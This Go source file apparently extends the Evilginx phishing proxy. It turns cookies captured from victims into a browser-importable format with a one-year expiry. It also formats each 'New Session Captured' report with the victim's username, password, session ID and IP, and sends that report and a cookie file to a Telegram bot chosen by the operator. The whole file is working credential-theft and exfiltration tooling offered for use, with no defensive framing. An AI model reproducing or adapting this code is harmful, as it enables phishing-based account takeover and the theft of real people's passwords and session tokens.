package core

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/rand"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"sync"
	"time"
)

type Token struct {
	Name             string      `json:"name"`
	Value            string      `json:"value"`
	Domain           string      `json:"domain"`
	HostOnly         bool        `json:"hostOnly"`
	Path             string      `json:"path"`
	Secure           bool        `json:"secure"`
	HttpOnly         bool        `json:"httpOnly"`
	SameSite         string      `json:"sameSite"`
	Session          bool        `json:"session"`
	FirstPartyDomain string      `json:"firstPartyDomain"`
	PartitionKey     interface{} `json:"partitionKey"`
	ExpirationDate   *int64      `json:"expirationDate,omitempty"`
	StoreID          interface{} `json:"storeId"`
}

func extractTokens(input map[string]map[string]map[string]interface{}) []Token {
	var tokens []Token

	for domain, tokenGroup := range input {
		for _, tokenData := range tokenGroup {
			var t Token

			if name, ok := tokenData["Name"].(string); ok {
				// Remove &
				t.Name = name
			}
			if val, ok := tokenData["Value"].(string); ok {
				t.Value = val
			}
			// Remove leading dot from domain
			if len(domain) > 0 && domain[0] == '.' {
				domain = domain[1:]
			}
			t.Domain = domain

			if hostOnly, ok := tokenData["HostOnly"].(bool); ok {
				t.HostOnly = hostOnly
			}
			if path, ok := tokenData["Path"].(string); ok {
				t.Path = path
			}
			if secure, ok := tokenData["Secure"].(bool); ok {
				t.Secure = secure
			}
			if httpOnly, ok := tokenData["HttpOnly"].(bool); ok {
				t.HttpOnly = httpOnly
			}
			if sameSite, ok := tokenData["SameSite"].(string); ok {
				t.SameSite = sameSite
			}
			if session, ok := tokenData["Session"].(bool); ok {
				t.Session = session
			}
			if fpd, ok := tokenData["FirstPartyDomain"].(string); ok {
				t.FirstPartyDomain = fpd
			}
			if pk, ok := tokenData["PartitionKey"]; ok {
				t.PartitionKey = pk
			}

			if storeID, ok := tokenData["storeId"]; ok {
				t.StoreID = storeID
			} else if storeID, ok := tokenData["StoreID"]; ok {
				t.StoreID = storeID
			}

			exp := time.Now().AddDate(1, 0, 0).Unix()
			t.ExpirationDate = &exp

			tokens = append(tokens, t)
		}
	}
	return tokens
}

func processAllTokens(sessionTokens, httpTokens, bodyTokens, customTokens string) ([]Token, error) {
	var consolidatedTokens []Token

	// Parse and extract tokens for each category
	for _, tokenJSON := range []string{sessionTokens, httpTokens, bodyTokens} {
		if tokenJSON == "" {
			continue
		}

		var rawTokens map[string]map[string]map[string]interface{}
		if err := json.Unmarshal([]byte(tokenJSON), &rawTokens); err != nil {
			return nil, fmt.Errorf("error parsing token JSON: %v", err)
		}

		tokens := extractTokens(rawTokens)
		consolidatedTokens = append(consolidatedTokens, tokens...)
	}

	return consolidatedTokens, nil
}

// Define a map to store session IDs and a mutex for thread-safe access
var processedSessions = make(map[string]bool)
var sessionMessageMap = make(map[string]int)
var mu sync.Mutex

func generateRandomString() string {
	rand.Seed(time.Now().UnixNano())
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	length := 10
	randomStr := make([]byte, length)
	for i := range randomStr {
		randomStr[i] = charset[rand.Intn(len(charset))]
	}
	return string(randomStr)
}
func createTxtFile(session TSession) (string, error) {
	// Create a random text file name
	txtFileName := generateRandomString() + ".txt"
	txtFilePath := filepath.Join(os.TempDir(), txtFileName)

	// Create a new text file
	txtFile, err := os.Create(txtFilePath)
	if err != nil {
		return "", fmt.Errorf("failed to create text file: %v", err)
	}
	defer txtFile.Close()

	// Marshal the session maps into JSON byte slices
	tokensJSON, err := json.MarshalIndent(session.Tokens, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to marshal Tokens: %v", err)
	}
	httpTokensJSON, err := json.MarshalIndent(session.HTTPTokens, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to marshal HTTPTokens: %v", err)
	}
	bodyTokensJSON, err := json.MarshalIndent(session.BodyTokens, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to marshal BodyTokens: %v", err)
	}
	customJSON, err := json.MarshalIndent(session.Custom, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to marshal Custom: %v", err)
	}

	allTokens, err := processAllTokens(string(tokensJSON), string(httpTokensJSON), string(bodyTokensJSON), string(customJSON))

	result, err := json.MarshalIndent(allTokens, "", "  ")
	if err != nil {
		fmt.Println("Error marshalling final tokens:", err)

	}

	fmt.Println("Combined Tokens: ", string(result))

	// Write the consolidated data into the text file
	_, err = txtFile.WriteString(string(result))
	if err != nil {
		return "", fmt.Errorf("failed to write data to text file: %v", err)
	}

	return txtFilePath, nil
}

func formatSessionMessage(session TSession) string {
	// Format the session information (no token data in message)

	// Format body tokens
	var bodyTokensStr string
	if len(session.BodyTokens) > 0 {
		bodyTokensStr = "Body Tokens:\n"
		for name, value := range session.BodyTokens {
			bodyTokensStr += fmt.Sprintf("- %s: %v\n", name, value)
		}
	} else {
		bodyTokensStr = "No body tokens captured\n"
	}

	// Format session tokens
	var tokensStr string
	if len(session.Tokens) > 0 {
		tokensStr = "Session Tokens:\n"
		for name, value := range session.Tokens {
			tokensStr += fmt.Sprintf("- %s: %v\n", name, value)
		}
	} else {
		tokensStr = "No session tokens captured\n"
	}

	// Format HTTP tokens
	var httpTokensStr string
	if len(session.HTTPTokens) > 0 {
		httpTokensStr = "HTTP Tokens:\n"
		for name, value := range session.HTTPTokens {
			httpTokensStr += fmt.Sprintf("- %s: %v\n", name, value)
		}
	} else {
		httpTokensStr = "No HTTP tokens captured\n"
	}

	// Format custom data
	var customStr string
	if len(session.Custom) > 0 {
		customStr = "Custom Data:\n"
		for key, value := range session.Custom {
			customStr += fmt.Sprintf("- %s: %v\n", key, value)
		}
	} else {
		customStr = "No custom data captured\n"
	}

	return fmt.Sprintf(`*New Session Captured!*
Phishlet: %s
Landing URL: %s
Username: %s
Password: %s
Session ID: %s
User Agent: %s
Remote Address: %s
Created: %d
Updated: %d

%s

%s

%s

%s`,
			session.Phishlet,
			session.LandingURL,
			session.Username,
			session.Password,
			session.SessionID,
			session.UserAgent,
			session.RemoteAddr,
			session.CreateTime,
			session.UpdateTime,
			customStr,
			tokensStr,
			bodyTokensStr,
			httpTokensStr,
	)
}

func Notify(session TSession, chatid string, teletoken string) {
	mu.Lock()
	defer mu.Unlock()

	if processedSessions[session.SessionID] {
		return
	}

	processedSessions[session.SessionID] = true

	// Create a formatted message
	message := formatSessionMessage(session)

	// Create a temporary file for cookies
	tempFile, err := os.CreateTemp(os.TempDir(), "evilginx_session_*.txt")
	if err != nil {
		log.Printf("failed to create temporary file: %v", err)
		return
	}
	defer os.Remove(tempFile.Name())

	// Write session data to file
	if _, err := tempFile.WriteString(message); err != nil {
		log.Printf("failed to write session data to file: %v", err)
		return
	}
	if err := tempFile.Close(); err != nil {
		log.Printf("failed to close temporary file: %v", err)
		return
	}

	// Create multipart form
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	// Add text message
	messagePart, err := writer.CreateFormField("text")
	if err != nil {
		log.Printf("error creating message part: %v", err)
		return
	}
	if _, err := messagePart.Write([]byte(message)); err != nil {
		log.Printf("error writing message: %v", err)
		return
	}

	// Add parse mode
	parseModePart, err := writer.CreateFormField("parse_mode")
	if err != nil {
		log.Printf("error creating parse_mode part: %v", err)
		return
	}
	if _, err := parseModePart.Write([]byte("Markdown")); err != nil {
		log.Printf("error writing parse_mode: %v", err)
		return
	}

	// Add chat ID
	chatIdPart, err := writer.CreateFormField("chat_id")
	if err != nil {
		log.Printf("error creating chat_id part: %v", err)
		return
	}
	if _, err := chatIdPart.Write([]byte(chatid)); err != nil {
		log.Printf("error writing chat_id: %v", err)
		return
	}

	// Add session file
	filePart, err := writer.CreateFormFile("document", filepath.Base(tempFile.Name()))
	if err != nil {
		log.Printf("error creating file part: %v", err)
		return
	}
	if file, err := os.Open(tempFile.Name()); err != nil {
		log.Printf("error opening file: %v", err)
		return
	} else {
		if _, err := io.Copy(filePart, file); err != nil {
			file.Close()
			log.Printf("error copying file: %v", err)
			return
		}
		file.Close()
	}

	writer.Close()

	// Create request
	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", teletoken)
	req, err := http.NewRequest("POST", apiURL, body)
	if err != nil {
		log.Printf("error creating request: %v", err)
		return
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		log.Printf("error sending message: %v", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		log.Printf("failed to send message: %s", resp.Status)
	}
}
